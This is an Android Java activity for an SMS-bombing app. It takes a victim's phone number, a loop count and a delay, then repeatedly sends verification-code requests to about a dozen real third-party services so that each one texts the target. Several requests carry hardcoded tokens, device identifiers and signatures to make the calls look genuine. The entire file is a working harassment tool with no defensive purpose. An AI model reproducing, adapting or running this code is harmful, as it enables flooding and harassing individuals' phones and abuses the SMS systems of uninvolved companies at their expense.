package com.sms.smsdemo;

import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import com.jiangyu.common.base.BaseActivity;
import com.jiangyu.common.entity.EventCenter;
import com.jiangyu.common.utils.CommonUtils;
import com.jiangyu.common.utils.SharedPreferencesUtil;
import com.jiangyu.common.utils.StringUtil;
import com.jiangyu.common.utils.ToastUtil;
import com.lzy.okgo.OkGo;
import com.lzy.okgo.callback.StringCallback;
import com.lzy.okgo.model.Response;

import butterknife.Bind;
import butterknife.OnClick;

public class MainActivity extends BaseActivity {

    @Bind(R.id.phone)
    EditText phone;
    @Bind(R.id.loop_count)
    EditText loopCount;
    @Bind(R.id.time_sleep)
    EditText timeSleep;
    @Bind(R.id.boom)
    Button boom;
    @Bind(R.id.stop)
    Button stop;
    @Bind(R.id.log)
    TextView log;
    private int successNumber = 0;//成功次数
    private int sloopCount = 1;//循环次数
    private StringCallback callback = new StringCallback() {
        @Override
        public void onSuccess(final Response<String> response) {
            if (response.body().contains("成功")
                    || response.body().contains("验证码已")
                    || response.body().contains("已发送")
                    || (response.body().contains("isError") && response.body().contains("false"))
                    || response.body().contains("ok")
                    || response.body().contains("Succeed")
                    || response.body().contains("succeed")
                    || response.body().contains("Success")
                    || response.body().contains("success")) {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        ToastUtil.showShort(response.body());
                        log.setText("当前循环：" + (sloopCount - 1) + "\n成功次数:" + ++successNumber);
                    }
                });
            } else {
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        log.setText("当前循环：" + (sloopCount - 1) + "\n成功次数:" + successNumber);
                    }
                });
            }
        }

        @Override
        public void onError(final Response<String> response) {
            super.onError(response);
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    ToastUtil.showShort(response.body());
                }
            });
        }
    };
    private Thread thread;

    @OnClick({R.id.boom, R.id.stop})
    public void onViewClicked(View view) {
        int viewId = view.getId();
        switch (viewId) {
            case R.id.boom:
                successNumber = 0;
                sloopCount = 1;
                String sphone = phone.getText().toString();
                sloopCount = Integer.parseInt(loopCount.getText().toString());
                SharedPreferencesUtil.setValue(mContext, "phone", sphone);
                if (!CommonUtils.isMobileNoValid(sphone)) {
                    ToastUtil.showShort("Please enter the 11 phone number");
                    return;
                }
                thread = new Thread(boomRun);
                thread.start();
                break;
            case R.id.stop:
                thread.interrupt();
                ToastUtil.showShort("stop");
                break;
        }

    }

    private Runnable boomRun = new Runnable() {
        @Override
        public void run() {
            String sphone = phone.getText().toString();
            String stimeSleep = timeSleep.getText().toString();
            try {
                OkGo.<String>post("http://pod.dsylove.com/user/getSmsCode").params("phoneNum", sphone).params("appName", "dsylove").headers("token", "986244129").tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("https://api2.quhepai.com/user/getsmscode?os=Android&model=SM-G930F&area_id=110000&rctk=&imei=865821079483270&hpid=&ver=1.6.9&long=106.67963615746643&build=1712211344&token_temp=&netk=&nonce=1515146882410&token=&sa=SvWDOSgflCTktWN2gZJeA26s%2FKsJfvkYUf3h8KsEJ%2FxBUE3KOW%2BlQWy3g9bqRlNZ0EYGzUKwOb%2F0%0AYgOREoKTl3mmqa2pcsblrYUDbkDcT8dQiWJ9VxTaKqeIEbVl38VE4rXB1avYbPR2zOkD28c7%2Fas%2F%0Ap0R38lq3nziMVHRap34%3D&company=samsung&logined=0&api=39&verCode=446&user_id=&ch=hepai_s_018&lat=26.636185489185326&type=1&phone=" + sphone).tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("https://www.1yuanxing.com/apiAngular/getSMS.jsp?username=" + sphone).tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("http://api-cc.babybus.org/User/VerificationCode?al=403&ost=1&type=1&channel=A002&phone=" + sphone).tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("https://api2.drcuiyutao.com/v55/user/sendVerificationCode?dialCode=86&mobile=" + sphone).tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("https://api.shiguangxiaowu.cn/zh-CN/verify_codes?reset=false&phone_code=86&phone=" + sphone).tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("http://api-www.wawachina.cn/rest/message/verification/code/send/v50?userType=1&action=register&sessionKey=null&sign_v2=OpwcFIhvcmQdWVK4bPehpWA4dZt7fltgeObgM8suTPI=").upJson(sphone).tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("http://pay.babybus.org/V2/User/sendCode/flag/1").headers("ClientHeaderInfo", "0eyJWZXJDb2RlIjoiOS4yMC4xMC4wMCIsIkFjY291bnRJRFNpZ25hdHVyZSI6IiIsIkFwcExhbmciOiJ6aCIsIkJTU0lEIjoiMDElM0E4MCUzQWMyJTNBMDAlM0EwMCUzQTAzIiwiQ0hDb2RlIjoiQTAwMiIsIlRva2VuIjoiIiwiU2ltSURGQSI6IiIsIkRldmljZUxhbmciOiJ6aCIsIkRldmljZU1vZGVsIjoiU00tRzkzMEYiLCJTZXNzaW9uSUQiOiIiLCJJREZBIjoiIiwiSURGViI6IiIsIklNRUkiOiI4NjU4MjEwNzk0ODMyNzAiLCJKYkZsYWciOiIiLCJMb2dpbkNvZGUiOiIiLCJMb2dpblNpZ25hdHVyZSI6IiIsIlNlcmlhbCI6IjQwNzEwNDMzMjU5MDg4NzciLCJNYWMiOiIwOCUzQTAwJTNBMjclM0FlMyUzQTU4JTNBMGUiLCJTY3JlZW4iOiIxMDgwKjE5MjAiLCJSVGltZSI6IiIsIk9TVmVyIjoiNC40LjQiLCJPcGVuSUQiOiI0MDcxMDQzMzI1OTA4ODc3Xzg2NTgyMTA3OTQ4MzI3MF8wOCUzQTAwJTNBMjclM0FlMyUzQTU4JTNBMGUiLCJBY2NvdW50SUQiOjAsIkxvZ2luU3RhbXAiOjAsIlByb2plY3RJRCI6NiwiT1NUeXBlIjoyLCJOZXQiOjEsIlByb2R1Y3RJRCI6MzAxNywiRGV2aWNlVHlwZSI6MSwiRGF0YVR5cGUiOjIsIkNISUQiOjAsIlBsYXRGb3JtIjoxMSwiVmVySUQiOjB9").params("phone", sphone).tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("http://admin.tengw.cn/api").params("params", "{\"data\":{\"captcha\":\"twzhyj\",\"mobile\":\"" + sphone + "\"},\"usr_token\":\"\",\"biz\":\"com.api.v3.password.forgot.create\",\"uac_id\":\"\"}").tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("https://www.cookmami.com/user/sumSend").params("send_code", "6397").params("deviceId", "865821079483270").params("mobile", sphone).tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("http://api.qbaoting.com/v3.0.0/Passport/User/sendMobileCode?hash=34b0ed9ec277e226ebf263d06c9ee186&appid=50&deviceid=50973785a25a5494fe9dbe5847419032&time=1515492625&channel=x360").params("mobile", sphone).params("type", "1").tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);
                OkGo.<String>post("http://api2.gymboclub.com/?app=api&mod=Oauth&act=sendRegisterSMS").params("phone",sphone).tag(this).execute(callback);
                Thread.sleep(Integer.parseInt(stimeSleep) * 1000);


                //test commit
                //test commit
                //test commit


                if (--sloopCount > 0) {
                    thread = new Thread(boomRun);
                    thread.start();
                } else {
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            ToastUtil.showShort("finish");
                        }
                    });
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    };


    @Override
    protected void onEventComing(EventCenter var1) {

    }

    @Override
    protected void initComponents() {
        String oldphone = SharedPreferencesUtil.getValue(mContext, "phone");
        if (!StringUtil.isEmpty(oldphone)) {
            phone.setText(oldphone);
        }
    }

    @Override
    protected void initData() {

    }

    @Override
    protected int getMainContentViewId() {
        return R.layout.activity_main;
    }
}
